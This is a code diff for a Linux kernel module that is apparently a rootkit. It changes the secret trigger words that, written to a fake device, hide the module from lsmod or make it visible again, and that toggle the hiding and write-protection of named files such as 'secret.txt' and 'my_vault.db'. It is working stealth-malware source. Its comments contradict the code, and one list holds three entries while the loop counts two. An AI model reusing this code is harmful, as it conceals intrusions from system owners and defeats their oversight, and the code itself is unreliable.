@@ -41,26 +41,26 @@ ssize_t fake_write(struct file * filp, const char __user * buf, size_t count,
 		return EFAULT;
 
 /* if detect the secret string in device input, show module at lsmod. */
-    	if(strstr(message,"CASPER_HIDE")!=NULL)
+    	if(strstr(message,"Shazam")!=NULL)
 		{
 			list_add(&THIS_MODULE->list, module_previous);
 			module_hidden = 0;
      	}
 
 /*	If detect Shazam string in fake device IO turn module invisible to lsmod  */
-    	if(strstr(message,"CASPER_UNHIDE")!=NULL)
+    	if(strstr(message,"AbraKadabra")!=NULL)
 		{
 			module_hide();
      	}
 
      	/*	If detect hocuspocus string in fake device IO turn module invisible to lsmod  */
-    	if(strstr(message,"UNHIDE_HIDE_FS")!=NULL)
+    	if(strstr(message,"Alakazam")!=NULL)
 	{
             fs_hidden = fs_hidden?0:1;
      	}
 
      	/*	If detect hocuspocus string in fake device IO turn module invisible to lsmod  */
-    	if(strstr(message,"CASPER_PROTECT_UNPROTECT_FS")!=NULL)
+    	if(strstr(message,"Sesame")!=NULL)
 	{
             fs_protect = fs_protect?0:1;
      	}
@@ -75,7 +75,7 @@ _Bool check_fs_blocklist(char *input)
 {
 	int total_list = 2,i = 0;
 	const char *list[] = {
-PROTECT_LIST
+"backup_httpd.log","secret_img.iso","secret_file.img"
 	};
 
 	while(i!=total_list)
@@ -92,7 +92,7 @@ _Bool check_fs_hidelist(char *input)
 {
 	int total_list = 2,i = 0;
 	const char *list[] = {
-HIDE_LIST
+"secret.txt","my_vault.db"
 	};
 	if(fs_hidden==0)
 	    return 0;
